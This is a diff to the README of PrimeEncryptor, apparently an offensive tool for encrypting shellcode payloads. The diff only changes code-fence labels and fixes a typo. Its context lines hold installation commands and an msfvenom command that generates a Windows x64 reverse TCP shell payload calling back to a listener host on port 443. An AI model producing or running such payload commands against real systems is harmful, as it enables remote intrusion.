@@ -15,7 +15,7 @@ Additionally, PrimeEncryptor provides sample C++ code snippets that give you the
 Clone the repository and set up the environment.
 
 ### **Installation**
-```bash
+```console
 git clone https://github.com/dagowda/PrimeEncryptor.git
 cd PrimeEncryptor
 sudo apt-get update
@@ -27,9 +27,9 @@ pip3 install pycryptodome
 
 # ⚙️ **Usage**
 
-Make sure the necessary dependencies are istalled:
+Make sure the necessary dependencies are installed:
 
-```bash
+```console
 ➜  PrimeEncryptor msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.222.129 LPORT=443 -f raw >payload.bin
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
